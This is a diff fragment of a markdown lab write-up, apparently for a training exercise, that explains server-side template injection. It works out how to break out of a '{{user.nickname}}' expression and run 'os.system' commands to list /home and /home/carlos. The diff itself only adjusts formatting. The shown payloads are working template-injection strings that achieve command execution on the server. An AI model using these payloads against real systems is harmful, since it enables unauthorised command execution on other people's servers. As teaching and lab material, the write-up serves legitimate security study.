@@ -50,14 +50,12 @@
 * I will do in order as the server but i will inject my payload:
 
 ```
-{{user.nickname......................i_will_inject_here..........................}}
+{{user.nickname...............i_will_inject_here.................}}
 ```
 * Then the server will close with `}}` automatically.
 - So it is a payload: `}}{%import os%}{{os.system('ls /home/carlos')`
 * The final form with payload after injecting in the server side it will seem like that:
-```
 `{{user.name`  }}{%import+os%}{{os.system('ls') `}}` 
-```
 - list content of `/home` directory:
 ```
 user.name}}{%import os%}{{os.system('ls+/home')
